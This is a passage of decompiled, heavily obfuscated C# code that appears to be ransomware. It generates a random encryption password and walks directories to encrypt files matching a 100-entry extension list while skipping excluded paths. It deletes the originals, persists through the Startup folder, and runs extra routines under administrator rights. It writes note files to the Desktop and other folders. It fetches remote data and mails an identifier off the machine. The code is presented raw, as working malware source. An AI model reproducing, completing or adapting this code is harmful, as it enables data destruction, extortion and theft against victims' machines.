								tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107349620), GpMeZoreMAmJ);
							}
							else
							{
								tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107349620), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!mAogUeKgKjciiQM)
								{
									UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, GpMeZoreMAmJ);
								}
								else
								{
									UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (xhPAPGRrPiLSI)
								{
									try
									{
										File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107349579) + ex14.Message + getString_0(107397114));
									}
									catch (Exception)
									{
									}
								}
								nejJdrwjWaKRmO++;
								return;
							}
						}
						if (mAogUeKgKjciiQM)
						{
							if (ENjMrAcnRYQPq != getString_0(107349625))
							{
								LDYdJQzZKPd(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, bytes2);
							}
							else
							{
								LDYdJQzZKPd(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			jFEDMGNYImhkubB.Remove(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
		}

		static zCsmcvfctIQqb()
		{
			Strings.CreateGetStringDelegate(typeof(zCsmcvfctIQqb));
		}
	}

	private sealed class OOgokAXFWUfYJeMi
	{
		public string FEUtJutbYcsNaSAX;

		public string eJOsLWTydMlX;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(FEUtJutbYcsNaSAX);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(eJOsLWTydMlX))
					{
						File.Delete(eJOsLWTydMlX);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string iBuLohfzVoFNG;

	public static byte[] GpMeZoreMAmJ;

	public static string HXlLaIOCjltyI;

	public static string ixIGGardILHOj;

	public static List<string> MsFMDtBGMtqBqX;

	public static List<string> TJbsYBLbcd;

	public static string PsmYbbQuRtTP;

	public static string iQTIcymIJnskgc;

	public static string aCDGJyDdOWVs;

	public static string MwIbOYWIQhAf;

	public static int YXQtvWCuhZJ;

	public static string ZvCBEZNGHm;

	public static string yTpxznvoIZdJ;

	public static string iQrkzvByimREr;

	public static string USjPOvlcddbV;

	public static string kTWZFbUhPOL;

	public static string ihJXPlXvqxvcUbk;

	public static string VxyMnLwuihuEo;

	public static string fMQaHPCWDalEW;

	public static List<string> gIfEoSlZCCIWfA;

	public static List<string> kYHVChgvsRpLIPK;

	public static string kNJZXpeedH;

	public static string uRJKfhyyQXgE;

	public static string HTvwaciuDBvPwnPb;

	public static List<string> twsigDVIjwu;

	public static string hRzYFKBGJYes;

	private static string KlcvoTuiWR;

	public static string PEsWJvkMybol;

	public static string PnQOwbfZZzod;

	public static List<string> vyojuHEzbxvum;

	public static List<string> NSFejjdbOLe;

	public static List<string> ALqQabkUSs;

	public static List<string> iiNbUxIvSmq;

	public static string HyeuKiqpXqV;

	public static List<string> ApMSsmUNniwbaMD;

	public static List<string> evkVjPQlpItnaFb;

	public static string QWTvElnRXNO;

	public static string vgsyPNDtzh;

	internal static DateTime SqILnnSoydEMoMrr;

	internal static DateTime QjtxViGZbW;

	public static string vBKqMUxzeIsbM;

	public static string yYEzOFFalxHtfd;

	public static string YQqiQJunFv;

	public static string tYqJtrdgHQ;

	public static string LRPUQHpSvgpvrI;

	public static string BVyBPJyORWlF;

	public static string zMgorXbhLOu;

	public static string GmyAlsJsED;

	public static List<string> GudmyYRjNKBi;

	public static string mIyxJtJKMNcFYRO;

	public static string gIBdCgacaih;

	public static string BrFflFnyld;

	public static string uEalWVhQubDqvM;

	public static string GraFriEIAmqfcs;

	public static string dcKCqZzVFrYFQ;

	public static string VAYxgIyNtLpbn;

	public static string QQDpTRndRmIeXb;

	public static string KrijLNFzkPOQaZ;

	public static string MhlfKrXswfohvBt;

	public static string wCJyIqeqonYHbW;

	public static string HcOtZLnEwpodt;

	public static string exiMxVEHZdMEW;

	public static string fmmIDlpGEZmQqC;

	public static string PWGKGFXHXOyjSC;

	public static string HAfmVGfOShL;

	public static string fPOrHGGPMPIhsWLG;

	public static string ZezBtTGeBxu;

	public static string XblbRgYrmyClGVh;

	public static string TtSJHFNNcPb;

	public static string bmduXcpmAuV;

	public static string xHWYOiNXSrLHCWd;

	public static string ImrLQAuCutOgK;

	public static string uQsZjiirTHGva;

	public static string wwdbwPvQwNQjO;

	public static string socxDHCoEPccv;

	public static string cnqbTCccgr;

	public static string lFNrSOKcMAnpI;

	public static string quzMXQQhtrem;

	public static string[] lFlokvUqCTG;

	public static string pyThwSTgTjjfN;

	public static bool uXImrDqeGgUMuqj;

	public static string cBWqLUfGobEI;

	public static bool mAogUeKgKjciiQM;

	public static bool XAsZzUWfFAgi;

	public static bool FesYYanmDUtUQA;

	public static bool vAgVlByEayFzfoibj;

	public static string YnUuGHOKmtC;

	public static bool xhPAPGRrPiLSI;

	public static bool NdfhUjZcwiRyNT;

	public static bool LTMizWIopWlYeRK;

	public static bool KiWrkOzwNeQ;

	public static bool TpjoUwgOYzae;

	public static string wTGMrYOLtLBvkP;

	public static bool AuaquqZBglw;

	public static Stopwatch aVTAyBIzbTph;

	public static int nejJdrwjWaKRmO;

	public static int nYFqJsGRovRB;

	public static bool PAqNnRchDyH;

	public static string MjsEcDNWxGU;

	public static string[] FiJKkdRXpBBaq;

	public static List<string> AqgSksLxvYymxLtJY;

	public static int xXSuOpTgTfavY;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			ntZBwGacGnI CS_0024_003C_003E8__locals0 = new ntZBwGacGnI();
			CS_0024_003C_003E8__locals0.fHevaDWKMh = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.fHevaDWKMh) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			dMbgGljRCKnwz.cgzftOdwSMtdC(KlcvoTuiWR);
		}
		catch (Exception)
		{
		}
		try
		{
			if (socxDHCoEPccv == getString_0(107396902))
			{
				Thread thread = new Thread(xnsVvAehWJRRqQ.BcaKYqioqhN);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (iQrkzvByimREr == getString_0(107396902))
		{
			Thread.Sleep(int.Parse(USjPOvlcddbV));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && zMgorXbhLOu == getString_0(107396902))
		{
			try
			{
				xNhiyKryEBbF(PezUDwzFibxi(getString_0(107396897)));
			}
			catch
			{
			}
		}
		try
		{
			if (VxyMnLwuihuEo == getString_0(107396902) && BoFxnwddDe.oyNUdJRyLvOjEE())
			{
				new RpqNWOTrzSgX().gTDyhKlfPscHPqO(bool_0: false);
				BoFxnwddDe.JVqPHytUjVOFooGT();
			}
		}
		catch (Exception)
		{
		}
		if (uRJKfhyyQXgE == getString_0(107396902) && BoFxnwddDe.oyNUdJRyLvOjEE())
		{
			new RpqNWOTrzSgX().gTDyhKlfPscHPqO(bool_0: false);
			new RpqNWOTrzSgX().LHedWgvnujrcDnjl();
		}
		if (yTpxznvoIZdJ == getString_0(107396902))
		{
			AvWxcUDxPzXW.foDNNcRaBb();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396760);
			string text2 = text + Path.GetFileName(fileName);
			if (MwIbOYWIQhAf == getString_0(107396902) && fileName != text2)
			{
				Thread thread2 = new Thread(PuKUOeLeQVa);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (PsmYbbQuRtTP == getString_0(107396902) && mainModule != null && fileName != text2)
			{
				try
				{
					YXQtvWCuhZJ = kXKaRtQesWT(0, gIfEoSlZCCIWfA.Count);
					File.Copy(fileName, text + gIfEoSlZCCIWfA[YXQtvWCuhZJ], overwrite: true);
					Process.Start(text + gIfEoSlZCCIWfA[YXQtvWCuhZJ]);
					WhwtpTrkWxTq();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (QWTvElnRXNO == getString_0(107396902) && DateTime.Now < SqILnnSoydEMoMrr)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (vgsyPNDtzh == getString_0(107396902) && DateTime.Now > QjtxViGZbW)
			{
				WhwtpTrkWxTq();
			}
		}
		catch
		{
		}
		kUQJNYlHhJjwOg();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> nSFejjdbOLe = NSFejjdbOLe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						hdbKundeWzS(PezUDwzFibxi(getString_0(107349541)), string_0);
					};
				}
				Parallel.ForEach(nSFejjdbOLe, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> aLqQabkUSs = ALqQabkUSs;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						hdbKundeWzS(PezUDwzFibxi(getString_0(107349496)), string_0);
					};
				}
				Parallel.ForEach(aLqQabkUSs, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (quzMXQQhtrem == getString_0(107396902))
				{
					string[] source = lFlokvUqCTG;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							hdbKundeWzS(PezUDwzFibxi(getString_0(107349496)), getString_0(107349503) + string_0 + getString_0(107349462));
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!VtxukLeuoIqnc().Contains(getString_0(107349218)))
				{
					jjXKaygZnMfv(HyeuKiqpXqV);
				}
				else
				{
					List<string> source2 = iiNbUxIvSmq;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							hdbKundeWzS(PezUDwzFibxi(vfxAFpsOEpfxFmq(getString_0(107349457))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> apMSsmUNniwbaMD = ApMSsmUNniwbaMD;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						hdbKundeWzS(PezUDwzFibxi(getString_0(107349432)), string_0);
					};
				}
				Parallel.ForEach(apMSsmUNniwbaMD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (exiMxVEHZdMEW == getString_0(107396755))
		{
			cLUWPxnllkOZy();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FesYYanmDUtUQA)
			{
				try
				{
					Thread thread4 = new Thread(uuPqPNmPaN.nmVzaENyjIxo);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			hdbKundeWzS(getString_0(107396750), PezUDwzFibxi(getString_0(107396769)));
		}
		SecureString secureString = new SecureString();
		if (YQqiQJunFv == getString_0(107396755))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			iQTIcymIJnskgc = getString_0(107397176);
		}
		aCDGJyDdOWVs = iAHfzSnUkutzj.JugqgFJafiYWrN(FehKKEUfqtPH(secureString));
		if (QQDpTRndRmIeXb == getString_0(107396902))
		{
			duFRjPsZFUoIV();
		}
		if (LTMizWIopWlYeRK)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), wTGMrYOLtLBvkP)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), wTGMrYOLtLBvkP), string.Concat(PezUDwzFibxi(getString_0(107397163)), new WebClient().DownloadString(PezUDwzFibxi(getString_0(107397106))), getString_0(107397097), PezUDwzFibxi(getString_0(107397092)), DateTime.Now, getString_0(107397097), PezUDwzFibxi(getString_0(107397019)), aCDGJyDdOWVs));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), wTGMrYOLtLBvkP), getString_0(107396994) + aCDGJyDdOWVs);
				}
			}
			catch (Exception ex7)
			{
				if (xhPAPGRrPiLSI)
				{
					try
					{
						File.AppendAllText(YnUuGHOKmtC, getString_0(107396453) + ex7.Message + getString_0(107397097));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		XRlDJzMhIlmoI.TGdSFhaBMmTJsCaI(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), TtSJHFNNcPb), mVIlYgHnwXvvZKv(aCDGJyDdOWVs), null, null, getString_0(107396372), getString_0(107396387), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			FrnFyxljGs();
		}
		try
		{
			try
			{
				if (AuaquqZBglw)
				{
					Console.WriteLine(getString_0(107396338));
				}
			}
			catch
			{
			}
			sRwboNuBnp(new string[1] { getString_0(107396321) }, new string[100]
			{
				getString_0(107396284),
				getString_0(107396279),
				getString_0(107396274),
				getString_0(107396297),
				getString_0(107396292),
				getString_0(107396287),
				getString_0(107396250),
				getString_0(107396245),
				getString_0(107396240),
				getString_0(107396267),
				getString_0(107396262),
				getString_0(107396257),
				getString_0(107396216),
				getString_0(107396211),
				getString_0(107396234),
				getString_0(107396229),
				getString_0(107396224),
				getString_0(107396699),
				getString_0(107396694),
				getString_0(107396689),
				getString_0(107396712),
				getString_0(107396707),
				getString_0(107396702),
				getString_0(107396665),
				getString_0(107396660),
				getString_0(107396655),
				getString_0(107396682),
				getString_0(107396677),
				getString_0(107396672),
				getString_0(107396635),
				getString_0(107396630),
				getString_0(107396625),
				getString_0(107396652),
				getString_0(107396647),
				getString_0(107396638),
				getString_0(107396601),
				getString_0(107396596),
				getString_0(107396591),
				getString_0(107396250),
				getString_0(107396618),
				getString_0(107396240),
				getString_0(107396609),
				getString_0(107396572),
				getString_0(107396567),
				getString_0(107396562),
				getString_0(107396557),
				getString_0(107396584),
				getString_0(107396579),
				getString_0(107396574),
				getString_0(107396537),
				getString_0(107396532),
				getString_0(107396527),
				getString_0(107396554),
				getString_0(107396549),
				getString_0(107396544),
				getString_0(107396507),
				getString_0(107396502),
				getString_0(107396497),
				getString_0(107396520),
				getString_0(107396515),
				getString_0(107396474),
				getString_0(107396461),
				getString_0(107396618),
				getString_0(107396480),
				getString_0(107395927),
				getString_0(107395918),
				getString_0(107395941),
				getString_0(107395900),
				getString_0(107395891),
				getString_0(107395886),
				getString_0(107395909),
				getString_0(107395868),
				getString_0(107395859),
				getString_0(107395854),
				getString_0(107395881),
				getString_0(107395876),
				getString_0(107395871),
				getString_0(107395834),
				getString_0(107395829),
				getString_0(107395852),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395837),
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395818),
				getString_0(107395809),
				getString_0(107395772),
				getString_0(107396652),
				getString_0(107395767),
				getString_0(107395762),
				getString_0(107395757),
				getString_0(107395784),
				getString_0(107395779),
				getString_0(107395738),
				getString_0(107395733),
				getString_0(107395728),
				getString_0(107395751),
				getString_0(107395746),
				getString_0(107395741)
			}, new string[0], FehKKEUfqtPH(secureString), getString_0(107395704));
		}
		catch (Exception ex9)
		{
			if (xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(YnUuGHOKmtC, getString_0(107395715) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202));
				streamWriter.WriteLine(PezUDwzFibxi(getString_0(107396169)));
				streamWriter.WriteLine(getString_0(107397097));
				streamWriter.WriteLine(PezUDwzFibxi(getString_0(107391903)));
				streamWriter.WriteLine(aCDGJyDdOWVs);
				if (PEsWJvkMybol == getString_0(107396755))
				{
					streamWriter.WriteLine(getString_0(107397097));
					streamWriter.WriteLine(PezUDwzFibxi(getString_0(107391870)) + Convert.ToString(twsigDVIjwu.Count));
				}
				if (PAqNnRchDyH)
				{
					streamWriter.WriteLine(getString_0(107397097));
					streamWriter.WriteLine(PezUDwzFibxi(getString_0(107391249)));
					streamWriter.WriteLine(KmMaNbsldEJY.ftqLxZfYrLhH());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202));
				if (!text3.Contains(aCDGJyDdOWVs) && !mAogUeKgKjciiQM)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202), getString_0(107391216) + aCDGJyDdOWVs);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in kYHVChgvsRpLIPK)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107396202)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202), item + getString_0(107396202), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202));
					if (!text4.Contains(aCDGJyDdOWVs) && !mAogUeKgKjciiQM)
					{
						File.AppendAllText(item + getString_0(107396202), getString_0(107391216) + aCDGJyDdOWVs);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!vAgVlByEayFzfoibj && num > 10)
			{
				break;
			}
		}
		if (ImrLQAuCutOgK == getString_0(107396902))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391187)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391187));
					streamWriter2.WriteLine(PezUDwzFibxi(getString_0(107391154)));
					streamWriter2.WriteLine(getString_0(107397097));
					streamWriter2.WriteLine(PezUDwzFibxi(getString_0(107352386)));
					streamWriter2.WriteLine(aCDGJyDdOWVs + PezUDwzFibxi(getString_0(107352297)));
					if (PEsWJvkMybol == getString_0(107396755))
					{
						streamWriter2.WriteLine(getString_0(107397097));
						streamWriter2.WriteLine(PezUDwzFibxi(getString_0(107352252)) + PezUDwzFibxi(getString_0(107391870)) + Convert.ToString(twsigDVIjwu.Count) + PezUDwzFibxi(getString_0(107352297)));
					}
					if (PAqNnRchDyH)
					{
						streamWriter2.WriteLine(getString_0(107397097));
						streamWriter2.WriteLine(PezUDwzFibxi(getString_0(107391249)));
						streamWriter2.WriteLine(KmMaNbsldEJY.ftqLxZfYrLhH());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202));
					if (!text5.Contains(aCDGJyDdOWVs) && !mAogUeKgKjciiQM)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391187), PezUDwzFibxi(getString_0(107352252)) + getString_0(107391216) + aCDGJyDdOWVs + PezUDwzFibxi(getString_0(107352297)));
					}
				}
			}
			catch
			{
			}
		}
		if (hRzYFKBGJYes == getString_0(107396902))
		{
			try
			{
				if (PEsWJvkMybol == getString_0(107396755))
				{
					KmMaNbsldEJY.tJqDJjDFLgaLvJg(getString_0(107352223), getString_0(107352186), getString_0(107352173), string.Concat(PezUDwzFibxi(getString_0(107397163)), new WebClient().DownloadString(PezUDwzFibxi(getString_0(107397106))), getString_0(107352196), PezUDwzFibxi(getString_0(107397092)), DateTime.Now, getString_0(107397097), PezUDwzFibxi(getString_0(107352191)), Convert.ToString(twsigDVIjwu.Count), getString_0(107397097), PezUDwzFibxi(getString_0(107397019)), aCDGJyDdOWVs));
				}
				else
				{
					KmMaNbsldEJY.tJqDJjDFLgaLvJg(getString_0(107352223), getString_0(107352186), getString_0(107352173), string.Concat(PezUDwzFibxi(getString_0(107397163)), new WebClient().DownloadString(PezUDwzFibxi(getString_0(107397106))), getString_0(107352196), PezUDwzFibxi(getString_0(107397092)), DateTime.Now, getString_0(107397097), PezUDwzFibxi(getString_0(107352191)), Convert.ToString(twsigDVIjwu.Count), getString_0(107397097), PezUDwzFibxi(getString_0(107397019)), aCDGJyDdOWVs));
				}
			}
			catch
			{
			}
		}
		if (fMQaHPCWDalEW == getString_0(107396902))
		{
			try
			{
				QgxDpubjmx.jTGQWicKRElAw(new Uri(getString_0(107352622)));
			}
			catch
			{
			}
		}
		if (ImrLQAuCutOgK == getString_0(107396755))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202)))
				{
					Process.Start(PezUDwzFibxi(getString_0(107352621)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396202));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391187)))
				{
					Process.Start(PezUDwzFibxi(getString_0(107352596)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391187));
				}
			}
			catch
			{
			}
		}
		if (QQDpTRndRmIeXb == getString_0(107396902))
		{
			if (KrijLNFzkPOQaZ == getString_0(107396902) && !string.IsNullOrEmpty(MhlfKrXswfohvBt) && !string.IsNullOrEmpty(wCJyIqeqonYHbW))
			{
				RuLCYwFCDgYB(MhlfKrXswfohvBt, wCJyIqeqonYHbW);
			}
			else
			{
				RuLCYwFCDgYB(getString_0(107352611), getString_0(107352582));
			}
		}
		if (fPOrHGGPMPIhsWLG != getString_0(107351804))
		{
			QdfEFCCQoiCFSM(fPOrHGGPMPIhsWLG);
		}
		if (!string.IsNullOrEmpty(dcKCqZzVFrYFQ))
		{
			try
			{
				File.Delete(dcKCqZzVFrYFQ);
			}
			catch
			{
			}
		}
		if (xhPAPGRrPiLSI)
		{
			try
			{
				File.AppendAllText(YnUuGHOKmtC, getString_0(107351819));
			}
			catch (Exception)
			{
			}
		}
		if (iBuLohfzVoFNG == getString_0(107351806))
		{
			WhwtpTrkWxTq();
		}
	}

	public static void PuKUOeLeQVa()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(PezUDwzFibxi(getString_0(107351765)), PezUDwzFibxi(getString_0(107352611)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int kXKaRtQesWT(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> sByLQIowDylVS(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107352123)) && !text.Contains(getString_0(107352130)) && !text.Contains(getString_0(107352097)) && !text.ToLower().Contains(getString_0(107352048)) && !text.ToLower().Contains(getString_0(107352067)) && !text.Contains(getString_0(107352042)) && !text.Contains(getString_0(107351989)) && !text.ToLower().Contains(getString_0(107352008)) && !text.ToLower().Contains(getString_0(107351963)) && !text.ToLower().Contains(getString_0(107351926)) && !text.ToLower().Contains(getString_0(107351917)) && !text.ToLower().Contains(getString_0(107351388)) && !text.ToLower().Contains(getString_0(107351375)) && !text.ToLower().Contains(getString_0(107351394)) && !text.ToLower().Contains(getString_0(107351341)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107351316)) && !fileInfo.FullName.Contains(getString_0(107351331)) && !fileInfo.FullName.Contains(getString_0(107351282)) && !fileInfo.FullName.Contains(getString_0(107351297)) && !fileInfo.FullName.Contains(getString_0(107351248)) && !fileInfo.FullName.Contains(getString_0(107351263)) && !fileInfo.FullName.Contains(getString_0(107351214)) && !fileInfo.FullName.Contains(getString_0(107351229)) && !fileInfo.FullName.Contains(getString_0(107351184)) && !fileInfo.FullName.Contains(getString_0(107351163)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351150)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351169)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351632)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351647)) && !fileInfo.FullName.Contains(PezUDwzFibxi(getString_0(107351598))) && !fileInfo.FullName.Contains(getString_0(107351573)) && !fileInfo.FullName.Contains(getString_0(107351592)) && !fileInfo.FullName.Contains(getString_0(107351543)) && !fileInfo.FullName.EndsWith(getString_0(107395704)) && !fileInfo.FullName.EndsWith(getString_0(107351550)) && !fileInfo.FullName.EndsWith(getString_0(107351513)) && !fileInfo.FullName.EndsWith(getString_0(107351508)) && !fileInfo.FullName.EndsWith(getString_0(107351503)) && !fileInfo.FullName.Contains(getString_0(107351530)) && !fileInfo.FullName.Contains(TtSJHFNNcPb) && !fileInfo.FullName.Contains(YnUuGHOKmtC) && !fileInfo.FullName.Contains(wTGMrYOLtLBvkP))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(ixIGGardILHOj) * 1024.0 * 1024.0 && HXlLaIOCjltyI == getString_0(107396902))
						{
							list.Add(fileInfo.FullName);
							VfdcdEIBdU(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && HXlLaIOCjltyI == getString_0(107396755))
						{
							list.Add(fileInfo.FullName);
							VfdcdEIBdU(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void cLUWPxnllkOZy()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107351481));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!MsFMDtBGMtqBqX.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107351460), getString_0(107396760)).Replace(getString_0(107351455), getString_0(107351460))
					.Replace(getString_0(107351414), getString_0(107352622))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					MsFMDtBGMtqBqX.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107351460), getString_0(107396760)).Replace(getString_0(107351455), getString_0(107351460))
